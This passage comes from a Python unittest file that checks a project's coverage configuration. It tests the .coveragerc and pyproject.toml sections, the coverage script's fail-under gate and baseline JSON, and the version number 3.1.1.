        path = os.path.join(PROJECT_ROOT, ".coveragerc")
        self.assertTrue(os.path.isfile(path), ".coveragerc must exist")

    def test_coveragerc_valid_ini(self):
        path = os.path.join(PROJECT_ROOT, ".coveragerc")
        config = configparser.ConfigParser()
        config.read(path)
        self.assertIn("run", config.sections())
        self.assertIn("report", config.sections())
        self.assertIn("html", config.sections())
        self.assertIn("json", config.sections())

    def test_coveragerc_source(self):
        path = os.path.join(PROJECT_ROOT, ".coveragerc")
        config = configparser.ConfigParser()
        config.read(path)
        source = config.get("run", "source")
        self.assertIn("opti_oignon", source)

    def test_coveragerc_branch_enabled(self):
        path = os.path.join(PROJECT_ROOT, ".coveragerc")
        config = configparser.ConfigParser()
        config.read(path)
        self.assertEqual(config.get("run", "branch"), "true")

    def test_coveragerc_omit_tests(self):
        path = os.path.join(PROJECT_ROOT, ".coveragerc")
        config = configparser.ConfigParser()
        config.read(path)
        omit = config.get("run", "omit")
        self.assertIn("tests/*", omit)
        self.assertIn("__pycache__", omit)

    def test_pyproject_coverage_section(self):
        path = os.path.join(PROJECT_ROOT, "pyproject.toml")
        content = _read(path)
        self.assertIn("[tool.coverage.run]", content)
        self.assertIn("[tool.coverage.report]", content)
        self.assertIn("[tool.coverage.html]", content)
        self.assertIn("[tool.coverage.json]", content)

    def test_pyproject_pytest_cov_dependency(self):
        path = os.path.join(PROJECT_ROOT, "pyproject.toml")
        content = _read(path)
        self.assertIn("pytest-cov", content)

    def test_coverage_script_exists(self):
        path = os.path.join(SCRIPTS_DIR, "run_coverage.sh")
        self.assertTrue(os.path.isfile(path), "scripts/run_coverage.sh must exist")

    def test_coverage_script_executable(self):
        path = os.path.join(SCRIPTS_DIR, "run_coverage.sh")
        self.assertTrue(os.access(path, os.X_OK), "run_coverage.sh must be executable")

    def test_coverage_script_has_fail_under(self):
        path = os.path.join(SCRIPTS_DIR, "run_coverage.sh")
        content = _read(path)
        self.assertIn("fail_under", content.lower().replace("-", "_").replace(" ", "_"),
                       "Coverage script must have fail-under gate")

    def test_coverage_baseline_json_exists(self):
        path = os.path.join(PROJECT_ROOT, "coverage_baseline.json")
        self.assertTrue(os.path.isfile(path), "coverage_baseline.json must exist")

    def test_coverage_baseline_json_valid(self):
        path = os.path.join(PROJECT_ROOT, "coverage_baseline.json")
        with open(path) as f:
            data = json.load(f)
        self.assertIn("overall_percent", data)
        self.assertIn("statements", data)
        self.assertIsInstance(data["overall_percent"], (int, float))


class TestVersionBump(unittest.TestCase):
    """Verify version is 3.1.1."""

    def test_version_file(self):
        path = os.path.join(BACKEND_DIR, "__version__.py")
        content = _read(path)
        self.assertIn('3.1.1', content)

    def test_pyproject_version_ref(self):
        path = os.path.join(PROJECT_ROOT, "pyproject.toml")
        content = _read(path)
        self.assertIn("opti_oignon.__version__.__version__", content)


if __name__ == "__main__":
    unittest.main()
